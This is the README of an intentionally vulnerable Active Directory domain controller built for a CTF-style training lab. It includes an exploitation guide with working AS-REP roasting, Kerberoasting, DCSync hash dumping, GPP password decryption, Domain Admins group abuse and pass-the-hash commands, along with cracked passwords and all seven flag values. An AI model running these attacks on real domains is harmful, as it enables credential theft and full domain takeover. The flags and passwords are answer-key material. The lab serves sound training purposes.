# 🏰 VulnCorp — Machine 7: int-dc01 (Active Directory Domain Controller)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 7 in the VulnCorp Enterprise testbed simulates the crown jewel of the enterprise: the **Primary Active Directory Domain Controller (`192.168.1.10`)** for `vulncorp.local` (`VULNCORP`). It hosts the core identity infrastructure, Kerberos KDC, LDAP catalog, and Group Policy shares riddled with intentional enterprise misconfigurations.

---

## 🚀 Deployment Options

### Option A: Real Windows Server 2019 VM (Native Active Directory)

Run this on a fresh **Windows Server 2019 VM** (Standard or Datacenter with Desktop Experience):

1. Set VM static IP: `192.168.1.10`, subnet `255.255.255.0`, gateway `192.168.1.1`, DNS `127.0.0.1`.
2. Open **PowerShell as Administrator**.
3. Run the automated deployment script:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\deploy_dc.ps1
```
4. The script will automatically install AD DS and promote the server to `vulncorp.local`, then reboot.
5. After reboot, log in as `VULNCORP\Administrator` (`Corp@Admin2024`) and re-run:
```powershell
.\deploy_dc.ps1
```
6. All 10 vulnerabilities, service accounts, ACLs, and 7 CTF flags are configured automatically!

---

### Option B: Docker Container (Linux VM / Quick Lab Deploy)

If you do not have a dedicated Windows Server VM, deploy the containerized Samba 4 Active Directory Domain Controller:

```bash
# 1. Enter the DC machine folder
cd Webserver/machines/int-dc01

# 2. Make the deploy script executable
chmod +x deploy.sh

# 3. Deploy (installs Docker if missing, provisions Samba AD DC, starts services)
sudo ./deploy.sh
```

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Exploitation Vector |
|---------|------|-------------|---------------------|
| **Kerberos KDC** | `88` (TCP/UDP) | RFC 4120 Authentication | AS-REP Roasting & Kerberoasting |
| **Active Directory LDAP** | `389` / `636` | Directory Service | Anonymous / User LDAP enumeration & BloodHound |
| **Microsoft SMB 2/3** | `445` | SMB 2.0 / 3.0 (Signing disabled) | GPP cPassword leak & NTLM Relay (CVE-2008-4037) |
| **Microsoft SMBv1** | `445` / `139` | SMBv1 (NT1 protocol enabled) | EternalBlue-style enumeration (CVE-2017-0144 ref) |
| **DNS Server** | `53` (TCP/UDP) | Active Directory Integrated DNS | Zone transfer & internal name resolution |
| **MSRPC / Endpoint** | `135` | RPC Endpoint Mapper | DCSync DRSUAPI RPC & Remote Management |
| **Kerberos Password** | `464` (TCP/UDP) | Kerberos kpasswd | Password change service |
| **Global Catalog** | `3268` / `3269` | Forest Catalog LDAP | Forest-wide query enumeration |
| **Remote Desktop (RDP 10.0)** | `3389` | Windows RDP (no NLA) | Login without NLA; brute-force & pass-the-hash RDP |
| **WinRM HTTP** | `5985` | Windows Remote Management | `evil-winrm` shell with NTLM auth (no TLS) |
| **WinRM HTTPS** | `5986` | WinRM HTTPS (self-signed) | Remote PowerShell execution |
| **SSH** | `2222` (host) | OpenSSH (container) | Administrative access (`john.doe` / `Corp@Admin2024`) |

---

## 🎯 Configured Vulnerabilities & CVEs

| # | Vulnerability | CVE / CWE | Severity | Details |
|---|---------------|-----------|----------|---------|
| 1 | **AS-REP Roasting** | CWE-308 | 🔴 Critical (7.5) | `svc_backup` has Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`). Request AS-REP without credentials and crack offline. |
| 2 | **Kerberoasting** | CWE-308 | 🔴 Critical (7.5) | `svc_erp` (`HTTP/erp.vulncorp.local`) and `svc_sql` (`MSSQLSvc/sql.vulncorp.local:1433`) have registered SPNs. Request TGS tickets and crack offline. |
| 3 | **DCSync Rights (Domain Dump)** | CWE-269 | 🔴 Critical (9.8) | `svc_backup` is granted `Replicating Directory Changes` & `GenericAll` on domain root. Dump all domain password hashes via DRSUAPI. |
| 4 | **BloodHound GenericWrite on DA** | CWE-732 | 🔴 Critical (8.8) | `svc_erp` has `GenericWrite` / `WriteProperty` permissions on the `Domain Admins` group. Directly add any user to Domain Admins. |
| 5 | **SYSVOL GPP cPassword** | **CVE-2014-1812** (MS14-025) | 🔴 Critical (8.5) | `\\vulncorp.local\SYSVOL\...\Groups.xml` contains an AES-encrypted cPassword for user `backdoor`. Decrypt with Microsoft's published key. |
| 6 | **SMB Signing Disabled (NTLM Relay)** | **CVE-2008-4037** | 🟡 Medium (5.3) | `RequireSecuritySignature = False`. Allows capturing NTLM authentication and relaying to DCSync or SMB services. |
| 7 | **PrintNightmare RCE** | **CVE-2021-34527** | 🔴 Critical (9.8) | Windows Print Spooler (`spoolsv.exe`) running with `PointAndPrint` restrictions disabled. Allows SYSTEM code execution. |
| 8 | **RDP Without NLA** | CWE-306 | 🟡 Medium (5.3) | Network Level Authentication disabled (`UserAuthentication = 0`). Allows connecting to RDP login prompt directly. |
| 9 | **Password Spraying Vulnerability** | CWE-521 | 🟠 High (7.5) | `helpdesk` user has weak known password `Helpdesk@123` (discovered via OSINT / employee list). |
| 10 | **Domain Administrator Password Reuse** | CWE-521 | 🔴 Critical (8.8) | Built-in `Administrator` and `john.doe` share `Corp@Admin2024` with local administrator credentials across endpoints. |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. Active Directory User Enumeration (LDAP / Anonymous)

```bash
# Query LDAP users and descriptions from Kali:
ldapsearch -x -H ldap://192.168.1.10 -b "DC=vulncorp,DC=local" "(objectClass=user)" sAMAccountName description

# Or using crackmapexec / netexec:
nxc smb 192.168.1.10 -u '' -p '' --users
```

### 2. AS-REP Roasting (`svc_backup` — No PreAuth)

```bash
# Request AS-REP ticket without credentials:
python3 GetNPUsers.py vulncorp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10 -format hashcat -outputfile asrep.hashes

# Crack with hashcat (Mode 18200):
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
# Cracks to: Backup@Svc2024
```

### 3. Kerberoasting (`svc_erp` & `svc_sql`)

```bash
# Request service tickets using authenticated user (e.g. svc_backup or helpdesk):
python3 GetUserSPNs.py vulncorp.local/svc_backup:Backup@Svc2024 -dc-ip 192.168.1.10 -request -outputfile kerberoast.hashes

# Crack with hashcat (Mode 13100):
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
# svc_erp cracks to: Erp@Service99!
```

### 4. DCSync Attack (Full Domain Hash Dump)

```bash
# Perform DCSync using svc_backup:
python3 secretsdump.py vulncorp.local/svc_backup:Backup@Svc2024@192.168.1.10

# Dumps:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576ac37e5a04b7b2512f43cb8842...:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d2a6a1...:::
```

### 5. SYSVOL Group Policy cPassword Extraction

```bash
# Connect to SYSVOL anonymously:
smbclient //192.168.1.10/SYSVOL -N

# Locate Groups.xml and decrypt:
gpp-decrypt "VZBQoGpDMEUESqPnEFTqMg=="
# Password: backdoor
```

### 6. BloodHound Collection & Path Abuse

```bash
# Collect domain graph:
bloodhound-python -u svc_backup -p 'Backup@Svc2024' -d vulncorp.local -ns 192.168.1.10 -c all

# Abuse GenericWrite on Domain Admins via svc_erp:
net rpc group addmem "Domain Admins" "svc_erp" -U "vulncorp.local/svc_erp%Erp@Service99!" -S 192.168.1.10
```

### 7. Pass-the-Hash / WinRM Dominance

```bash
# Execute commands as Domain Administrator:
python3 wmiexec.py -hashes :<NTLM_HASH> Administrator@192.168.1.10 "type C:\flags\domain_flag.txt"
```

---

## 🏆 Flags (All 7 Flags from Masterplan)

| # | Flag | Location | Value | Vulnerability Vector |
|---|------|----------|-------|----------------------|
| **1** | AS-REP Roast Flag | `C:\flags\asrep_flag.txt` / AD attribute | `VULN{4sr3p_r04st_cr4ck3d}` | Kerberos Pre-Authentication Disabled |
| **2** | Kerberoast Flag | `C:\flags\kerberoast_flag.txt` / AD attribute | `VULN{k3rb3r04st_svc_pwn3d}` | SPN Registration Extraction |
| **3** | PrintNightmare Flag | `C:\flags\printnightmare_flag.txt` / spooler | `VULN{pr1ntn1ghtm4r3_dc}` | Print Spooler Exploitation (CVE-2021-34527) |
| **4** | Password Spray Flag | `C:\flags\password_spray_flag.txt` / `helpdesk` | `VULN{p4ssw0rd_spr4y_h1t}` | Password Spraying (`Helpdesk@123`) |
| **5** | DCSync Flag | `C:\flags\dcsync_flag.txt` / `krbtgt` account | `VULN{dcs1nc_h4sh_dump3d}` | DRSUAPI Directory Replication Dump |
| **6** | GPP cPassword Flag | `C:\flags\gpp_flag.txt` / SYSVOL `Groups.xml` | `VULN{gpp_p4ssw0rd_l34k}` | SYSVOL cPassword Decryption (CVE-2014-1812) |
| **7** | **🏆 Crown Jewel Flag** | `C:\flags\domain_flag.txt` / Desktop / `/root` | `VULN{d0m41n_4dm1n_3mp1r3_f3ll}` | Full Domain Compromise / Domain Admin |

---

## 🧹 Teardown & Cleanup

For Docker deployment:
```bash
sudo docker compose down --rmi all --volumes
sudo docker builder prune -af
```
